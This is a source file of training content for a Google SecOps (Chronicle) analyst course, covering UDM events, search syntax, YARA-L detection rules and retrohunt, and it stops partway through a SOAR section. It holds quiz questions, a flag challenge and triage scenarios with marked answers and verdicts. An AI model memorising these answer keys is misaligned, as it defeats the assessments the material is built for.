/**
 * Learning Rooms -- Batch 50
 *
 * Rooms in this batch:
 *  1. google-secops-fundamentals -- Google SecOps (Chronicle) for Analysts
 *
 * SOURCES consulted directly (Google Security Operations documentation,
 * docs.cloud.google.com/chronicle/docs, checked 2026-11-09):
 *  - UDM field list (top-level structures, metadata fields, Process/File/Dns/Http fields)
 *  - UDM usage guide (event types; required fields for PROCESS_LAUNCH, USER_LOGIN,
 *    NETWORK_DNS; failed login security_result.category AUTH_VIOLATION)
 *  - Format log data as UDM / UDM REST reference (principal, target, src, observer,
 *    intermediary, about definitions; SecurityResult.Action enum)
 *  - Default parser reference for Windows Sysmon (Image, ParentImage, CommandLine,
 *    ParentCommandLine, ProcessId, User, Hashes, DestinationIp/Port, QueryName mapping
 *    and the event types for Sysmon event 1, 3, 22)
 *  - UDM search and UDM search best practices (syntax, value types, regex, nocase,
 *    enumerated-field rule, repeated fields, epoch timestamps, time range, Max Results)
 *  - YARA-L 2.0 overview, match, condition, events syntax and windowing logic
 *    (sections, hop / tumbling / sliding windows, 1m to 48h, condition grammar)
 *  - Run a rule against historical data (retrohunt: default one week, range >= match
 *    window, alerting creates a SOAR alert per detection, overflow cases)
 *  - Curated detections and Applied Threat Intelligence (precise vs broad, Status and
 *    Alerting toggles, categories, ATI priorities Active Breach / High / Medium)
 *  - Investigate an asset (Asset view: prevalence graph, insights, low prevalence on
 *    the top private domain <= 10, newly registered via WHOIS, default 2 hour window)
 *  - SOAR cases overview, case playbooks, playbooks overview, Close Case dialog
 *
 * Deliberately left out because it could not be confirmed against the docs: any count
 * of default parsers, licensing detail beyond the ATI Enterprise Plus note, and exact
 * console labels beyond those quoted above.
 *
 * LOG RULES: raw blocks are UDM events written as flat dotted keys (the way the
 * SecOps UDM viewer shows them), vendor "Google SecOps", registered in
 * scripts/log-field-registry.json. No verdict fields. Threat-intel and prevalence
 * context is stated in the scenario text, never in raw. Documentation-range IPs only.
 */

export const roomsBatch50 = [
  {
    "id": "google-secops-fundamentals",
    "title": "Google SecOps (Chronicle) for Analysts",
    "description": "Work inside Google Security Operations like an analyst: read raw logs as UDM events, write UDM searches, use entity views, prevalence and threat intelligence, understand YARA-L rules, retrohunt and curated detections, and run a case in SOAR.",
    "difficulty": "intermediate",
    "category": "SIEM",
    "estimatedMinutes": 65,
    "xp": 170,
    "icon": "🧭",
    "prerequisites": [
      "siem-fundamentals",
      "threat-intelligence"
    ],
    "tasks": [
      {
        "type": "reading",
        "id": "gso-r1",
        "heading": "Google SecOps: One Platform, Four Jobs",
        "content": "**What you are looking at.** Google Security Operations (Google SecOps) is Google's cloud platform for security operations. Many analysts still call it by its older name, Chronicle, and the documentation addresses still say \"chronicle\". It joins a SIEM (security information and event management: the system that collects logs, searches them and raises alerts) with a SOAR (security orchestration, automation and response: the system that turns alerts into cases and runs automated playbooks). Threat intelligence and an AI assistant sit on top of both.\n\n### The four jobs\n\n| Job | What it does | Where an analyst meets it |\n|---|---|---|\n| SIEM | Ingests logs, parses them into one schema called UDM (Unified Data Model), stores them, searches them and runs detection rules written in YARA-L | UDM Search, Rules, Detections |\n| SOAR | Groups alerts into cases, keeps a Case Wall (the case's activity log) and runs playbooks (automated step lists) | Cases queue, Case Wall, Playbooks |\n| Threat intelligence | Matches your events against indicators of compromise (IOCs, such as bad domains, IPs and file hashes) curated by Mandiant through Applied Threat Intelligence (ATI), and ships curated detections written by Google Cloud Threat Intelligence | IOC matches, curated rule sets |\n| Gemini | Google's AI model: it can turn an English question into a UDM search and summarize search results | Search bar, Gemini pane |\n\n### Why organizations migrate\n\nTeams leaving an older SIEM usually name the same pains. Every vendor names fields differently, so a rule has to be rewritten for each log source. Searching old data is slow or needs an archive restored first. Alert triage lives in a different tool from detection. Google SecOps answers each one by design: a single schema for every source, a search that reaches back as far as the tenant's log retention allows (the UDM search time range tops out at 365 days and is always bounded by the retention setting), and SIEM and SOAR in one console.\n\nMigration is still real work. Every parser, rule and integration has to be mapped and tested, and the list of supported log types and default parsers is published in a reference page. Check that list before you promise that a source is covered.\n\n### A log's journey\n\nFollow one event. A laptop writes a Sysmon event. A feed or forwarder delivers it to SecOps tagged with its log type. The parser for that log type extracts fields and writes a UDM event. YARA-L rules and your searches read UDM events, not the raw text. A rule match becomes a detection, the alert reaches SOAR, SOAR groups alerts that share entities into a case, and a playbook can enrich the case and take actions.\n\n### What an analyst asks\n\n- Which log source produced this event, and was it parsed or only stored raw?\n- Which part of the platform am I in (search, detection or case)? The same event looks different in each.\n- What is the time range? Every answer is bounded by it.\n- If Gemini wrote the query, does the query say what I meant? Treat generated queries as drafts and read them before trusting the results.",
        "diagram": "flowchart LR\n  A[Laptop writes a Sysmon event] --> B[Feed delivers it with a log type]\n  B --> C[Parser writes a UDM event]\n  C --> D[UDM Search]\n  C --> E[YARA-L rule]\n  E --> F[Detection and alert]\n  F --> G[SOAR case]\n  G --> H[Playbook]",
        "diagramCaption": "One event's journey through Google SecOps",
        "checkpoint": {
          "question": "What always bounds how far back a UDM Search can reach?",
          "options": [
            "The tenant's log-retention configuration, within the 365-day UDM search maximum",
            "The number of detection rules enabled in the tenant when the search is run",
            "The size of the result table, which is always cut off at one thousand rows",
            "The age of the oldest parser version installed for each ingested log type"
          ],
          "answer": 0,
          "explanation": "The documentation says a search's maximum range is always bounded by the tenant's log-retention configuration, and the UDM search maximum is 365 days. The number of enabled rules has no effect on search range. The row cap is a separate Max Results setting (1k, 30k, 100k or 1M, default 30k), not a time limit. Parser versions affect how events were written, not how far back you may search."
        }
      },
      {
        "type": "reading",
        "id": "gso-r2",
        "heading": "From Raw Log to UDM Event",
        "content": "**The idea.** A raw log is whatever a product wrote: a Sysmon XML record, a firewall syslog line, a JSON audit entry. Every vendor names things differently. A parser reads one log type and writes a UDM event, which has the same named slots for every source. You search and write rules against the slots, so one query covers every vendor. Parsers apply as logs are ingested: a parser change is not applied retroactively to events already stored.\n\n### The shape of a UDM event\n\n| Structure | What it holds |\n|---|---|\n| metadata | What kind of event, when and from where: event_timestamp, event_type, product_event_type, ingested_timestamp, log_type |\n| principal | The acting entity that originates the activity |\n| target | The entity being referenced or acted on |\n| src | The source entity being acted upon, for example the machine a file is copied from |\n| intermediary | Systems the activity passes through, such as a proxy or a mail relay |\n| observer | A device that watches and reports without being in the path, such as a packet sniffer or a vulnerability scanner |\n| about | Other entities the event mentions, such as an email attachment or a DLL loaded during a process launch |\n| network, security_result | Protocol, DNS and HTTP detail; what the source product concluded (action, severity, rule_name) |\n\n### metadata.event_type decides the rest\n\nThe event type tells you which other fields must exist. Process events include PROCESS_LAUNCH, PROCESS_OPEN and PROCESS_INJECTION. Network events include NETWORK_CONNECTION, NETWORK_DNS and NETWORK_HTTP. User events include USER_LOGIN, USER_LOGOUT and USER_RESOURCE_ACCESS. There are also file, registry, service, scheduled task and email families.\n\n- PROCESS_LAUNCH needs a machine identifier in principal and the launched process in target.process.\n- USER_LOGIN needs target.user. Principal is set only for remote activity, so a local keyboard logon leaves it unset. A failed login adds a security_result with category AUTH_VIOLATION.\n- NETWORK_DNS needs network.application_protocol set to DNS and the queried name in network.dns.questions.name.\n\n### Worked example: Sysmon event 1, 3 and 22\n\nThe default Sysmon parser maps by event ID. On event 1 (process creation) the new process lands in target and its parent in principal. On event 3 (network connection) the process that connected is the principal and the far end is the target.\n\n| Sysmon field | UDM field | Event IDs |\n|---|---|---|\n| Image | target.process.file.full_path | 1 |\n| Image | principal.process.file.full_path | 3 and 22 (and others) |\n| ParentImage | principal.process.file.full_path | 1 |\n| CommandLine | target.process.command_line | 1 |\n| ParentCommandLine | principal.process.command_line | 1 |\n| User | principal.user.userid | any except 24 |\n| DestinationIp, DestinationPort | target.ip, target.port | 3 |\n| QueryName | network.dns.questions.name | 22 |\n\nThe same field name can land in a different place depending on the event, which is why you always check the event type first. If a field you expect is empty in UDM, open the raw log: the source may carry it while the parser does not map it.\n\n### What an analyst asks\n\n- Is the value I need in principal or target for this event type?\n- Which event type am I filtering on?\n- Does the UDM event agree with the raw log?",
        "codeExample": "metadata.event_timestamp   = 2026-11-03T09:14:22Z\nmetadata.event_type        = NETWORK_CONNECTION\nmetadata.product_event_type = 3\nprincipal.hostname         = kf-ws-0230\nprincipal.user.userid      = d.salazar\nprincipal.process.file.full_path = C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\ntarget.ip                  = 198.51.100.20\ntarget.port                = 443",
        "checkpoint": {
          "question": "On a USER_LOGIN for someone typing at a server's own keyboard, which noun identifies the person?",
          "options": [
            "target.user, because principal is left unset for local activity",
            "principal.user, because the person is the actor in the event",
            "src.user, because the account is the source of the credentials",
            "observer.user, because the server watched the logon happen"
          ],
          "answer": 0,
          "explanation": "For USER_LOGIN the user being logged on is target.user, and principal is populated only for remote activity, so a local logon leaves it unset. principal.user would be the wrong place for a local logon. src is for the source object of an action such as a file copy. observer describes a separate device that reports without being in the path."
        }
      },
      {
        "type": "matching",
        "id": "gso-m1",
        "heading": "Map Raw Sysmon Fields to UDM",
        "instructions": "Kestrel Freight sends Sysmon logs to Google SecOps through the default Sysmon parser. Match each raw Sysmon field to the UDM field the parser fills.",
        "pairs": [
          {
            "id": "p1",
            "left": "Event 1: Image (the new process)",
            "right": "target.process.file.full_path"
          },
          {
            "id": "p2",
            "left": "Event 1: ParentImage",
            "right": "principal.process.file.full_path"
          },
          {
            "id": "p3",
            "left": "Event 1: CommandLine",
            "right": "target.process.command_line"
          },
          {
            "id": "p4",
            "left": "Event 1: ParentCommandLine",
            "right": "principal.process.command_line"
          },
          {
            "id": "p5",
            "left": "Event 1: User",
            "right": "principal.user.userid"
          },
          {
            "id": "p6",
            "left": "Event 22: QueryName",
            "right": "network.dns.questions.name"
          }
        ],
        "explanation": "On event 1 the launched process goes in target (Image to target.process.file.full_path, CommandLine to target.process.command_line) and its parent goes in principal (ParentImage and ParentCommandLine). User is the account that ran it, so it lands in principal.user.userid. A DNS query (event 22) is a NETWORK_DNS event whose queried name is network.dns.questions.name. Remember the contrast: on event 3 and event 22 the Image is the actor, so it goes to principal.process.file.full_path instead.",
        "xp": 15
      },
      {
        "type": "reading",
        "id": "gso-r3",
        "heading": "UDM Search: Asking the Data a Precise Question",
        "content": "**One query shape.** UDM Search is the SIEM search page. Every condition has the form udm-field operator value, for example principal.hostname = \"win-server\". Operators are =, !=, <, >, <= and >=. Join conditions with AND, OR and NOT, and group them with parentheses. AND is assumed if you leave the operator out.\n\n### Write each value the way its type needs\n\n| Type | Write it as | Example |\n|---|---|---|\n| String | Double quotes | principal.hostname = \"kf-ws-0188\" |\n| Enumerated value | Double quotes, exact value | metadata.event_type = \"USER_LOGIN\" |\n| Number | No quotes | network.sent_bytes > 50000000 |\n| Boolean | No quotes | security_result.is_alert = true |\n| Timestamp | Epoch seconds on the .seconds part | metadata.ingested_timestamp.seconds = 1660784400 |\n\nAn ISO date string such as \"2022-08-18T01:00:00Z\" is not valid for a timestamp field.\n\n### Regex and nocase\n\nPut a regular expression between slashes: principal.process.command_line = /powershell/ nocase. The nocase modifier after a value makes the match ignore capitalization, and it works on plain strings too: target.user.userid = \"TIM.SMITH\" nocase. A regex matches anywhere inside the value, so you do not need wildcards at either end. A plain \"=\" with a string is an exact match of the whole value.\n\nTwo limits matter. You cannot use a regex on an enumerated field: metadata.event_type = /NETWORK_*/ is invalid. To match several event types, list each one with OR inside parentheses. And queries with many regular expressions run slower, so prefer exact fields where you can.\n\n### Repeated fields\n\nSome fields hold several values, such as principal.ip. A condition on a repeated field matches an event if any value satisfies it. A search for principal.ip != \"1.2.3.4\" still returns an event that carries both 1.2.3.4 and 5.6.7.8.\n\n### Time range and size\n\nThe time range is not part of the query. You set it with the Time Range control (absolute or relative), and a UDM search can reach back at most 365 days, always bounded by the tenant's retention. Max Results to Return is 1k, 30k, 100k or 1M, default 30k. Narrow the range and use specific UDM fields to keep searches fast.\n\n### Gemini\n\nThe search bar and the Gemini pane can turn an English question into a UDM query. Read the query it wrote: check the event type, the noun (principal or target) and the time range before you trust the results.\n\n### What an analyst asks\n\nWhich event type? Which noun holds the value? Is this field repeated? How wide is the time range, and did the result hit Max Results?",
        "codeExample": "metadata.event_type = \"NETWORK_DNS\"\nAND principal.hostname = \"kf-ws-0231\" nocase\nAND network.dns.questions.name = /\\.(top|xyz)$/ nocase",
        "checkpoint": {
          "question": "Where do you set how far back a UDM Search looks?",
          "options": [
            "With the Time Range control, not with a field inside the query",
            "With a metadata.event_timestamp condition added to the query text",
            "With the Max Results to Return setting, which sets the number of days",
            "With the nocase modifier, which widens the search to older events"
          ],
          "answer": 0,
          "explanation": "The range is chosen with the Time Range control (absolute or relative). A timestamp condition filters on event times inside that range but does not set the range. Max Results only caps how many events are returned (1k, 30k, 100k or 1M), not how many days. nocase only ignores capitalization when comparing values."
        }
      },
      {
        "type": "question",
        "id": "gso-q1",
        "question": "Priya asks for every launch on kf-ws-0188 whose own command line carries an encoded-command switch (such as -EncodedCommand), matched in any capitalization. Which UDM Search is correct?",
        "options": [
          "metadata.event_type = \"PROCESS_LAUNCH\" AND principal.hostname = \"kf-ws-0188\" AND target.process.command_line = /-enc/ nocase",
          "metadata.event_type = \"PROCESS_LAUNCH\" AND principal.hostname = \"kf-ws-0188\" AND principal.process.command_line = /-enc/ nocase",
          "metadata.event_type = /PROCESS_.*/ AND principal.hostname = \"kf-ws-0188\" AND target.process.command_line = /-enc/ nocase",
          "metadata.event_type = \"PROCESS_LAUNCH\" AND principal.hostname = \"kf-ws-0188\" AND target.process.command_line = \"-enc\" nocase"
        ],
        "answer": 0,
        "explanation": "The launched process is target.process, so its own command line is target.process.command_line, and a regex between slashes matches the switch anywhere inside the line. The second query searches principal.process.command_line, which is the parent's command line. The third uses a regex on an enumerated field, which is invalid: list exact event types with OR instead. The fourth uses = with a plain string, which must equal the entire command line, so it would not match a real one.",
        "xp": 10
      },
      {
        "type": "flag",
        "id": "gso-f1",
        "prompt": "Read the search results and answer: which hostname looked up the most lookalike domains?\n\nSearch: metadata.event_type = \"NETWORK_DNS\" AND network.dns.questions.name = /kestrel.*freight/ nocase\nTime range: 08:30 to 09:30 UTC. Kestrel Freight's real domain is kestrelfreight.example. Do not count it.\n\ntime | principal.hostname | principal.user.userid | network.dns.questions.name\n08:41:07 | kf-ws-0231 | m.petrov | kestrelfreight.example\n08:43:19 | kf-ws-0274 | o.mwangi | kestrel-freight-login.example\n08:43:52 | kf-ws-0190 | s.dube | kestrelfreight.example\n08:47:30 | kf-ws-0274 | o.mwangi | kestrel-freight-login.example\n08:52:11 | kf-ws-0302 | t.baptiste | kestrelfreight-portal.example\n08:55:48 | kf-ws-0231 | m.petrov | kestrelfreight.example\n08:58:44 | kf-ws-0274 | o.mwangi | kestrelfreight-portal.example\n09:03:05 | kf-ws-0302 | t.baptiste | kestrelfreight-portal.example\n09:04:40 | kf-ws-0231 | m.petrov | kestrelfreight.example\n09:10:16 | kf-ws-0231 | m.petrov | kestrel-freight-login.example\n\nAnswer with the hostname.",
        "answer": "kf-ws-0274",
        "hint": "Cross out the rows for the real domain first, then count what is left for each hostname.",
        "event": null,
        "xp": 15
      },
      {
        "type": "reading",
        "id": "gso-r4",
        "heading": "Entities, Prevalence and Threat Intelligence",
        "content": "**Entities.** Besides events, SecOps keeps context about the things events mention: assets (a hostname, IP or MAC address), users, IP addresses, domains and file hashes. Each has a view. Opening one asks \"what do we know about this thing, over time, and how unusual is it?\"\n\n### Asset view\n\nAsset view shows one asset's activity in a time window. The default window is two hours and the time slider moves between one minute and one day. Key parts:\n\n| Part | What it tells you |\n|---|---|\n| Timeline sidebar | The asset's events in order |\n| Prevalence graph | How many assets in your enterprise connected to each domain over the past seven days. Large gray circles mark first connections, red triangles mark alerts |\n| Domains sidebar | The first lookup of each distinct domain in the window, which filters out routine repeats |\n| Insight blocks | Newly registered domains (WHOIS says registered within the past 30 days), domains new to the enterprise, low prevalence domains, and forwarded alerts from other tools |\n\nThe low prevalence insight is based on the top private domain (for example the \"example.com\" part of \"a.b.example.com\") having a prevalence of 10 or less. A subdomain can be flagged because its parent domain is rare.\n\n### Low prevalence is a lead, not a verdict\n\nRare means \"few of us have been there\". A new software vendor, a conference site or a supplier's portal is rare too. The question is what else is true: what process asked, whether the domain is newly registered, whether anyone approved it.\n\n### Threat intelligence matches\n\nApplied Threat Intelligence (ATI) compares your UDM events with Mandiant-curated indicators (domains, IPs, file hashes and URLs). Each match carries a priority: Active Breach (indicators Mandiant observed in active or past compromises), High (linked by Google Threat Intelligence to threat actors or malware but not seen in Mandiant investigations) and Medium (a Malicious verdict with High severity). Alerts come from Active Breach and High matches, and Medium is best run in non-alerting mode first because of the volume. For network indicators, High and Medium match outbound traffic. The ATI rule sets need the Enterprise Plus license.\n\nCareful: \"prevalence\" appears in two places with different meanings. In Asset view it counts your own assets. Inside ATI scoring it means commonly observed by Mandiant.\n\nThe IOC matches page lists each match with its type, priority, status, assets, campaigns, sources and first and last seen times.\n\n### Shared infrastructure\n\nAn IP indicator can sit on shared hosting or a content delivery network (CDN). If dozens of your own assets reach the same address for a known vendor, a match on the IP alone may describe the neighbour, not the traffic.\n\n### What an analyst asks\n\nWhich process made the connection? How many of our assets did the same? What does the IOC match actually match: a domain, a hash or only an IP? Is there an approved change that explains it?",
        "checkpoint": {
          "question": "In Asset view, what does a domain's prevalence count?",
          "options": [
            "Assets in your own enterprise that connected to the domain over the past seven days",
            "Mandiant customers worldwide that have ever been contacted by that domain",
            "Alerts raised by third-party tools that mention the domain in the last two hours",
            "Rule sets in the tenant whose detections reference the domain in their events"
          ],
          "answer": 0,
          "explanation": "Asset view prevalence is the number of assets in your enterprise connected to the domain over the past seven days. The worldwide, Mandiant-observed notion is a separate ATI scoring feature. Forwarded alerts appear as their own insight and have nothing to do with prevalence. Rule sets do not contribute to a domain's prevalence."
        }
      },
      {
        "type": "analyst_choice",
        "id": "gso-ac1",
        "heading": "Triage: A Rare Domain in Asset View",
        "scenario": "You open Asset view for kf-lt-0612, a Procurement laptop used by j.petrov. The Domains sidebar flags files-edge-update.example with the low prevalence insight: one asset in the enterprise (this one) connected to it over the past seven days, and the newly registered insight also fires. The IOC matches page lists the same domain with Applied Threat Intelligence priority High. The lookup repeats every few minutes and began at 13:05. No software deployment ticket mentions the domain. The event below is one of those lookups. What is your verdict?",
        "event": {
          "id": "evt-gso-ac1-001",
          "ts": "2026-11-04T13:27:41.000Z",
          "source": "dns",
          "vendor": "Google SecOps",
          "event_type": "dns_query",
          "severity": "medium",
          "hostname": "kf-lt-0612",
          "user_title": "Procurement Analyst",
          "user": {
            "full_name": "J. Petrov",
            "email": "j.petrov@kestrelfreight.example",
            "department": "Procurement"
          },
          "dns": {
            "query": "files-edge-update.example",
            "query_type": "A"
          },
          "description": "UDM NETWORK_DNS event for kf-lt-0612 surfaced from Asset view.",
          "raw": {
            "metadata.event_timestamp": "2026-11-04T13:27:41Z",
            "metadata.event_type": "NETWORK_DNS",
            "metadata.product_event_type": "22",
            "principal.hostname": "kf-lt-0612",
            "principal.asset.hostname": "kf-lt-0612",
            "principal.user.userid": "j.petrov",
            "principal.process.pid": "6844",
            "principal.process.file.full_path": "C:\\Users\\j.petrov\\AppData\\Roaming\\SyncAgent\\syncagent.exe",
            "network.application_protocol": "DNS",
            "network.dns.questions.name": "files-edge-update.example"
          }
        },
        "correct_verdict": "true_positive",
        "explanation": "Several independent signals agree. Applied Threat Intelligence priority High means Google Threat Intelligence links the indicator to threat actors or malware. Prevalence of one plus a newly registered domain says nobody else in the company has any reason to visit it. The principal.process.file.full_path is an executable in the user's roaming profile, not an approved application directory, and the lookups repeat on a schedule with no change ticket. Together that is the shape of a program calling out to infrastructure, so the right next steps are to contain kf-lt-0612, search UDM for every other asset that resolved the domain, and open a case. Low prevalence alone would not have justified this, which is why you read the rest.",
        "xp": 20
      },
      {
        "type": "analyst_choice",
        "id": "gso-ac2",
        "heading": "Triage: An IOC Match on a Shared Address",
        "scenario": "The tenant has alerting switched on for the Medium priority Applied Threat Intelligence rule set, and it just alerted on kf-ws-0140, a Finance workstation used by a.fontaine. The IOC matches page shows IP address 198.51.100.40 with priority Medium. The IP address view shows 58 enterprise assets reached this address over the past seven days. The event below is the connection that matched. Choose your verdict.",
        "event": {
          "id": "evt-gso-ac2-001",
          "ts": "2026-11-05T08:52:10.000Z",
          "source": "proxy",
          "vendor": "Google SecOps",
          "event_type": "http_request",
          "severity": "medium",
          "hostname": "kf-ws-0140",
          "user_title": "Finance Analyst",
          "user": {
            "full_name": "A. Fontaine",
            "email": "a.fontaine@kestrelfreight.example",
            "department": "Finance"
          },
          "src_ip": "10.40.6.140",
          "dst_ip": "198.51.100.40",
          "dst_port": 443,
          "network": {
            "domain": "updates.ledgerworks.example",
            "method": "GET",
            "status": 200,
            "user_agent": "LedgerWorks-Updater/9.4.1 (Windows NT 10.0)"
          },
          "description": "UDM NETWORK_HTTP event matched by an Applied Threat Intelligence IOC rule.",
          "it_verify_result": "confirmed",
          "it_verify_message": "IT: LedgerWorks 9.4.1 is the approved finance application and its update was rolled out to Finance this week.",
          "raw": {
            "metadata.event_timestamp": "2026-11-05T08:52:10Z",
            "metadata.event_type": "NETWORK_HTTP",
            "principal.hostname": "kf-ws-0140",
            "principal.ip": "10.40.6.140",
            "principal.user.userid": "a.fontaine",
            "principal.process.file.full_path": "C:\\Program Files\\LedgerWorks\\LedgerWorks.exe",
            "target.hostname": "updates.ledgerworks.example",
            "target.ip": "198.51.100.40",
            "target.port": 443,
            "network.http.method": "GET",
            "network.http.response_code": 200,
            "network.http.user_agent": "LedgerWorks-Updater/9.4.1 (Windows NT 10.0)"
          }
        },
        "correct_verdict": "false_positive",
        "explanation": "The rule matched an IP address, but the activity is not what the intelligence is about. The traffic comes from a LedgerWorks executable in Program Files, asks the vendor's own update host name for a normal GET, receives a 200, and 58 of your own assets use the same address, which is what a shared hosting or content delivery address looks like. IT confirms the application and its rollout. Close the alert, and fix the cause rather than the rule: add an exclusion or suppression for this destination and keep the Medium rule set in non-alerting mode until its volume is understood.",
        "fp_trap": "Why it looks bad: an Applied Threat Intelligence match on a Finance workstation sounds like an indicator of compromise, and Medium priority still means Google linked the indicator to a Malicious verdict. What breaks the case is the context: the match is on an IP, not on the vendor's domain, that IP is shared by 58 of your own assets, the process is a signed-vendor path with a matching user agent, and IT confirms the update. A shared address inherits the reputation of its worst neighbour, so an IP-only match needs its host name and process checked before escalation.",
        "xp": 25
      },
      {
        "type": "reading",
        "id": "gso-r5",
        "heading": "YARA-L 2.0, Retrohunt and Curated Detections",
        "content": "**What YARA-L is.** YARA-L 2.0 is the language of Google SecOps detection rules. A rule watches incoming UDM events and raises a detection when its logic is met. A single-event rule has no match window. A multi-event rule joins events over a window.\n\n### Rule anatomy\n\n| Section | Job |\n|---|---|\n| meta | Descriptive fields: author, description, severity |\n| events | Declares event variables such as $e and filters them with UDM fields. Placeholder variables such as $user tie events together |\n| match | Groups events by variables over a time window |\n| outcome | Calculates values per detection, for example count() |\n| condition | Decides when the rule fires, for example #fail >= 5 |\n\nA rule needs meta, events and condition. The order is meta, events, match, outcome, condition.\n\n### Windows\n\n\"over 15m\" creates a hop window: fixed, overlapping windows whose alignment SecOps chooses, with the condition checked inside each one. \"by day\" creates a tumbling window: non-overlapping blocks where each event belongs to exactly one. \"over 5m after $e1\" creates a sliding window anchored to a pivot event, for strict sequences, in rules only. Duration is 1 minute to 48 hours (units m, h, d). To enforce order between events, compare timestamps in the events section, as in the example below.\n\n### Conditions\n\n#fail counts the events bound to $fail. A bare $success means at least one such event exists. Join conditions with and. A rule that needs an event not to exist adds an hour of latency, to allow for late data.\n\n### Retrohunt\n\nA retrohunt runs a rule over stored history to find threats you had not detected. The default range is one week, and for a multi-event rule the range must be at least the match window. If the rule has alerting enabled, a retrohunt creates a SOAR alert for every detection it finds, and large volumes can create overflow cases. Run it with alerting disabled, or make a new rule version, to avoid that.\n\n### Curated detections\n\nGoogle Cloud Threat Intelligence (GCTI) maintains curated detections: YARA-L rule sets for categories such as Cloud, Windows, Linux and macOS threats, plus Applied Threat Intelligence. Each set has precise rules (malicious threats with a high degree of confidence) and broad rules (suspicious behavior that is more common and produces more false positives). A Status toggle enables a set's precise or broad rules and an Alerting toggle decides whether detections alert. New sets start disabled with alerting off, and exclusions help control volume.\n\n### What an analyst asks\n\nDoes the window match how fast this attack really happens? Is the threshold above normal noise? Does the rule alert, or only record?",
        "codeExample": "rule kf_powershell_then_connection {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"PowerShell launched, then the same host made an outbound connection\"\n    severity = \"MEDIUM\"\n  events:\n    $proc.metadata.event_type = \"PROCESS_LAUNCH\"\n    $proc.target.process.file.full_path = /powershell\\.exe$/ nocase\n    $proc.principal.hostname = $host\n    $conn.metadata.event_type = \"NETWORK_CONNECTION\"\n    $conn.principal.hostname = $host\n    $conn.metadata.event_timestamp.seconds > $proc.metadata.event_timestamp.seconds\n  match:\n    $host over 10m\n  condition:\n    $proc and $conn\n}",
        "checkpoint": {
          "question": "Which rule section decides whether a detection actually fires?",
          "options": [
            "condition, for example a count threshold on an event variable",
            "meta, because severity decides which rules are allowed to fire",
            "match, because the window length alone decides what fires",
            "outcome, because every outcome variable becomes an alert"
          ],
          "answer": 0,
          "explanation": "The condition section holds the logic that must be true for a detection, such as #fail >= 5. meta only describes the rule. match defines the grouping variables and the window, but the condition still has to be met inside it. outcome calculates values that a condition can use, and does not raise alerts by itself."
        }
      },
      {
        "type": "ordering",
        "id": "gso-o1",
        "heading": "Assemble the Rule: Failed Logins, Then a Success",
        "instructions": "Priya is writing a YARA-L rule that fires when one user has at least five failed logins and then a successful login within 15 minutes. Kestrel's login parser sets security_result.action to FAIL on failures and ALLOW on successes. Put the pieces of the rule in order from top to bottom.",
        "items": [
          {
            "id": "s6",
            "text": "outcome: $fail_count = count($fail.metadata.id)"
          },
          {
            "id": "s3",
            "text": "events: $fail.metadata.event_type = \"USER_LOGIN\"  $fail.security_result.action = \"FAIL\"  $fail.target.user.userid = $user"
          },
          {
            "id": "s8",
            "text": "}"
          },
          {
            "id": "s1",
            "text": "rule kf_failed_then_success {"
          },
          {
            "id": "s5",
            "text": "match: $user over 15m"
          },
          {
            "id": "s7",
            "text": "condition: $fail_count >= 5 and $success"
          },
          {
            "id": "s2",
            "text": "meta: author = \"Kestrel SOC\"  severity = \"HIGH\""
          },
          {
            "id": "s4",
            "text": "(still in events) $success.metadata.event_type = \"USER_LOGIN\"  $success.security_result.action = \"ALLOW\"  $success.target.user.userid = $user  $success.metadata.event_timestamp.seconds > $fail.metadata.event_timestamp.seconds"
          }
        ],
        "correct_order": [
          "s1",
          "s2",
          "s3",
          "s4",
          "s5",
          "s6",
          "s7",
          "s8"
        ],
        "explanation": "A rule is the rule name, then its sections in the fixed order meta, events, match, outcome, condition, then the closing brace. Inside events, the success variable compares its timestamp with $fail, so it is written after $fail is declared; that comparison is what enforces failures first, success later. The shared $user placeholder joins both event variables to one account, match: $user over 15m limits the story to 15 minutes, and the condition requires five failures and at least one success.",
        "xp": 15
      },
      {
        "type": "question",
        "id": "gso-q2",
        "question": "Priya's new rule has alerting enabled. She wants to know how often it would have fired over the past week of stored events, without opening a pile of cases. What should she do?",
        "options": [
          "Run a retrohunt with alerting off, because each retrohunt detection on an alerting rule creates a SOAR alert",
          "Run a retrohunt with alerting on, because retrohunt detections stay in the rule view and never reach SOAR",
          "Copy the rule into UDM Search, because a retrohunt can only run curated detections and never custom rules",
          "Wait a week for live detections, because a rule cannot be applied to data stored before it was saved"
        ],
        "answer": 0,
        "explanation": "A retrohunt applies a rule to stored history, and for an alerting rule it creates a SOAR alert for every detection found. Run it with alerting disabled (or create a rule version with alerting off) to see the volume without alerts or overflow cases. The second option states the opposite of what happens. The third is wrong because retrohunt runs rules on the Rules page, custom ones included, and UDM Search cannot run rule logic such as match windows. The fourth is wrong because looking back at history is exactly what a retrohunt is for.",
        "xp": 10
      },
      {
        "type": "question",
        "id": "gso-q3",
        "question": "Kestrel switched on the Windows Threats curated rule set with Status and Alerting on for both precise and broad rules. The first week brings many alerts on approved admin scripts, all from broad rules. What is the best response?",
        "options": [
          "Leave precise alerting on, set broad alerting off, and add exclusions for the approved admin scripts",
          "Disable the whole rule set, because broad rules cannot be tuned once they have been enabled",
          "Turn alerting off for the precise rules as well, so both kinds of alert are handled the same way",
          "Delete the curated rules and rewrite each of them by hand as a custom YARA-L rule"
        ],
        "answer": 0,
        "explanation": "Precise rules find malicious threats with high confidence, so their alerts are worth keeping. Broad rules look for suspicious behavior that is more common and produces more false positives, so you can keep their detections without alerts while you review them, and exclusions remove known-good activity such as approved scripts. Disabling the set throws away the precise coverage. Turning off precise alerting hides the high-confidence signal. Rewriting curated rules loses Google's maintenance and is far more work than tuning.",
        "xp": 10
      },
      {
        "type": "reading",
        "id": "gso-r6",
        "heading": "SOAR: Cases, the Case Wall and Playbooks",
